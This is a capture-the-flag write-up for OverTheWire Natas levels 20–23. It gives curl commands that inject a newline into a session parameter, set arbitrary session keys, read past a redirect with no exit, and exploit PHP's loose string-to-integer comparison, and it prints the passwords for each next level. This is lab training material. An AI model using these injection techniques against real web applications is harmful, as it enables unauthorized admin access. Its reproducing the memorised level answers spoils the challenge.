# Natas

## level 20

This level we try to write ```admin 1``` to the session file and save the cookie in ```cookie.txt```.

```
$ curl -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF 'http://natas20.natas.labs.overthewire.org/?name=ving%0Aadmin%201&debug' -c cookie.txt
```

The session file will be writen as below.

```
name ving
admin 1
```

```
$ curl -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF http://natas20.natas.labs.overthewire.org/?debug -b cookie.txt
```

```
You are an admin. The credentials for the next level are:
Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
```

## level 21

```php
<?php
// http://natas21-experimenter.natas.labs.overthewire.org/index-source.html
// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
?>
```

This give us chance to set ```admin``` value and save the cookie.

```
$ curl -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21-experimenter.natas.labs.overthewire.org/?debug -d 'admin=1' -d 'submit=Update' -c cookie.txt
```

```
$ curl -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21.natas.labs.overthewire.org/?debug -b 'PHPSESSID=g6vcjrla9bv83197qugg85juo3'
```

```
You are an admin. The credentials for the next level are:
Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

## level 22

```php
<?php
// http://natas22.natas.labs.overthewire.org/index-source.html
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
```

We can't see the password in browser because we are redirected to ```/```.
Fortunately, there is no ```exit``` after redirection and the password is sent to browser client in fact.

```
$ curl -u natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org/?revelio
```

```
You are an admin. The credentials for the next level are:
Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```

## level 23

```php
<?php
// http://natas23.natas.labs.overthewire.org/index-source.html
if(array_key_exists("passwd",$_REQUEST)){
    if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas24 Password: <censored></pre>";
    }
    else{
        echo "<br>Wrong!<br>";
    }
}
?>
```

The password must include ```iloveyou``` and be greater than ```10``` after converted to integer.

```
$ curl -u natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE http://natas23.natas.labs.overthewire.org/ -F 'passwd=11iloveyou'
```

```
The credentials for the next level are:
Username: natas24
Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```
